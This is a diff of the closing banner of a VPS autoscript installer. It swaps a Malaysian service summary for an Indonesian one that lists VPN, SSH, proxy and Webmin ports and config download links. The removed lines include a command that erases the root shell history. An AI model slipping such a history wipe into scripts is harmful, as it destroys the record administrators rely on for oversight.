-echo "--------------------------------------------------------------------------------" | lolcat
-echo "========================================"  | tee -a log-install.txt | lolcat
-echo "Service Autoscript OrangKuatSabahanTerkini (OrangKuatSabahanTerkini SCRIPT 2017)"  | tee -a log-install.txt | lolcat
-echo "----------------------------------------"  | tee -a log-install.txt | lolcat
-echo ""  | tee -a log-install.txt | lolcat
-echo "nginx : http://$myip:80"   | tee -a log-install.txt | lolcat
-echo "Webmin : http://$myip:10000/"  | tee -a log-install.txt | lolcat
-echo "Squid3 : 8080"  | tee -a log-install.txt | lolcat
-echo "OpenSSH : 22"  | tee -a log-install.txt | lolcat
-echo "Dropbear : 109'110'442"  | tee -a log-install.txt | lolcat
-echo "SSL : 443"  | tee -a log-install.txt | lolcat
-echo "OpenVPN  : IP/client.ovpn"  | tee -a log-install.txt | lolcat
-echo "Fail2Ban : [on]"  | tee -a log-install.txt | lolcat
-echo "Timezone : Asia/Kuala_Lumpur"  | tee -a log-install.txt | lolcat
-echo "Menu : type menu to check menu script"  | tee -a log-install.txt | lolcat
-echo ""  | tee -a log-install.txt | lolcat
-echo "----------------------------------------" | lolcat
-echo "LOG INSTALL  --> /root/log-install.txt" | lolcat
-echo "----------------------------------------" | lolcat
-echo "========================================"  | tee -a log-install.txt | lolcat
-echo "      PLEASE REBOOT TO TAKE EFFECT !" | lolcat
-echo "========================================"  | tee -a log-install.txt | lolcat
-cat /dev/null > ~/.bash_history && history -c
+echo " "
+echo "Instaslasi telah selesai! Mohon baca dan simpan penjelasan setup server!"
+echo " "
+echo "--------------------------- Penjelasan Setup Server ----------------------------"
+echo "                         Copyright HostingTermurah.net                          "
+echo "                        https://www.hostingtermurah.net                         "
+echo "               Created By Steven Indarto(fb.com/stevenindarto2)                 "
+echo "--------------------------------------------------------------------------------"
+echo ""  | tee -a log-install.txt
+echo "Informasi Server"  | tee -a log-install.txt
+echo "   - Timezone    : Asia/Jakarta (GMT +7)"  | tee -a log-install.txt
+echo "   - Fail2Ban    : [on]"  | tee -a log-install.txt
+echo "   - IPtables    : [on]"  | tee -a log-install.txt
+echo "   - Auto-Reboot : [off]"  | tee -a log-install.txt
+echo "   - IPv6        : [off]"  | tee -a log-install.txt
+echo ""  | tee -a log-install.txt
+echo "Informasi Aplikasi & Port"  | tee -a log-install.txt
+echo "   - OpenVPN     : TCP 1194 "  | tee -a log-install.txt
+echo "   - OpenSSH     : 22, 143"  | tee -a log-install.txt
+echo "   - Dropbear    : 109, 110, 443"  | tee -a log-install.txt
+echo "   - Squid Proxy : 80, 3128, 8000, 8080 (limit to IP Server)"  | tee -a log-install.txt
+echo "   - Badvpn      : 7300"  | tee -a log-install.txt
+echo "   - Nginx       : 85"  | tee -a log-install.txt
+echo "   - PPTP VPN    : 1732"  | tee -a log-install.txt
+echo ""  | tee -a log-install.txt
+echo "Informasi Tools Dalam Server"  | tee -a log-install.txt
+echo "   - htop"  | tee -a log-install.txt
+echo "   - iftop"  | tee -a log-install.txt
+echo "   - mtr"  | tee -a log-install.txt
+echo "   - nethogs"  | tee -a log-install.txt
+echo "   - screenfetch"  | tee -a log-install.txt
+echo ""  | tee -a log-install.txt
+echo "Informasi Premium Script"  | tee -a log-install.txt
+echo "   Perintah untuk menampilkan daftar perintah: menu"  | tee -a log-install.txt
+echo ""  | tee -a log-install.txt
+echo "   Penjelasan script dan setup VPS"| tee -a log-install.txt
+echo "   dapat dilihat di: http://bit.ly/penjelasansetup"  | tee -a log-install.txt
+echo ""  | tee -a log-install.txt
+echo "Informasi Penting"  | tee -a log-install.txt
+echo "   - Download Config OpenVPN : http://$MYIP:85/client.ovpn"  | tee -a log-install.txt
+echo "     Mirror (*.tar.gz)       : http://$MYIP:85/openvpn.tar.gz"  | tee -a log-install.txt
+echo "   - Webmin                  : http://$MYIP:10000/"  | tee -a log-install.txt
+echo "   - Vnstat                  : http://$MYIP:85/vnstat/"  | tee -a log-install.txt
+echo "   - MRTG                    : http://$MYIP:85/mrtg/"  | tee -a log-install.txt
+echo "   - Log Instalasi           : cat /root/log-install.txt"  | tee -a log-install.txt
+echo "     NB: User & Password Webmin adalah sama dengan user & password root"  | tee -a log-install.txt
+echo ""  | tee -a log-install.txt
+echo "----------- Script Created By Steven Indarto(fb.com/stevenindarto2) ------------"
